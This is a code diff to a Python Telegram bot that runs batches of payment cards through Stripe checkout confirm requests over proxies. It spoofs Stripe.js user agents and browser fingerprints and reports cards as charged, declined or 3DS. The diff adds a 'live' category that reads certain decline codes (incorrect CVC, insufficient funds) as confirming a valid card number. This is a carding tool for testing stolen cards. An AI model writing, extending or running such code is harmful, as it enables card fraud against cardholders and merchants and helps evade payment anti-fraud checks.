@@ -190,8 +190,7 @@ def _generate_stripe_hash() -> str:
 def get_random_stripe_js_agent() -> str:
     """Get a Stripe.js payment_user_agent mimicking real browser."""
     build_hash = _generate_stripe_hash()
-    version = random.choice(STRIPE_JS_VERSIONS)
-    return f"stripe.js%2F{build_hash}%3B+stripe-js-{version}%2F{build_hash}%3B+checkout"
+    return f"stripe.js%2F{build_hash}%3B+stripe-js-v3%2F{build_hash}%3B+checkout"
 
 def generate_stripe_fingerprints(user_id: int = None) -> dict:
     """Generate Stripe.js fingerprint identifiers.
@@ -466,8 +465,15 @@ def format_time(seconds: float) -> str:
 
 CARD_SEPARATOR = "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
 STATUS_EMOJIS = {
-    'CHARGED': '😎', 'DECLINED': '🥲', '3DS': '😡',
+    'CHARGED': '😎', 'LIVE': '✅', 'DECLINED': '🥲', '3DS': '😡',
     'ERROR': '💀', 'FAILED': '💀', 'UNKNOWN': '❓'
+}
+
+# Decline codes that mean the card is LIVE (valid number, wrong details)
+LIVE_DECLINE_CODES = {
+    'incorrect_cvc', 'incorrect_zip', 'insufficient_funds',
+    'invalid_cvc', 'card_velocity_exceeded', 'do_not_honor',
+    'try_again_later', 'not_permitted', 'withdrawal_count_limit_exceeded',
 }
 
 def check_access(msg: Message) -> bool:
@@ -862,8 +868,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 )
                 
                 headers = get_headers(stripe_js=True)
-                # Add Stripe cookies — mimics real browser session
-                headers["cookie"] = get_stripe_cookies(fp)
                 
                 async with s.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -880,7 +884,12 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     dc = err.get("decline_code", "")
                     msg = err.get("message", "Failed")
                     err_code = err.get("code", "")
-                    result["status"] = "DECLINED"
+                    
+                    # Check if decline code indicates card is LIVE
+                    if dc in LIVE_DECLINE_CODES:
+                        result["status"] = "LIVE"
+                    else:
+                        result["status"] = "DECLINED"
                     if dc:
                         result["response"] = f"[{dc}] [{msg}]"
                     elif err_code:
@@ -1434,6 +1443,7 @@ async def co_handler(msg: Message):
         if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
             last_update = time.perf_counter()
             charged = sum(1 for r in results if r['status'] == 'CHARGED')
+            live = sum(1 for r in results if r['status'] == 'LIVE')
             declined = sum(1 for r in results if r['status'] == 'DECLINED')
             three_ds = sum(1 for r in results if r['status'] == '3DS')
             errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
@@ -1444,6 +1454,7 @@ async def co_handler(msg: Message):
                     f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
                     f"「❃」 𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                     f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} 😎</code>\n"
+                    f"「❃」 �𝗶𝘃𝗲 : <code>{live} ✅</code>\n"
                     f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} 🥲</code>\n"
                     f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 😡</code>\n"
                     f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} 💀</code></blockquote>",
@@ -1489,12 +1500,15 @@ async def co_handler(msg: Message):
     
     # Summary
     charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
+    live_count = sum(1 for r in results if r['status'] == 'LIVE')
     declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
     three_ds_count = sum(1 for r in results if r['status'] == '3DS')
     error_count = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN', 'NOT SUPPORTED'])
     
     response += f"\n<blockquote>💲 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:\n"
     response += f"😎 𝗛𝗶𝘁𝘀: {charged_count}\n"
+    if live_count > 0:
+        response += f"✅ 𝗟𝗶𝘃𝗲: {live_count}\n"
     response += f"🥲 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝘀: {declined_count}\n"
     if three_ds_count > 0:
         response += f"😡 𝟯𝗗𝗦: {three_ds_count}\n"
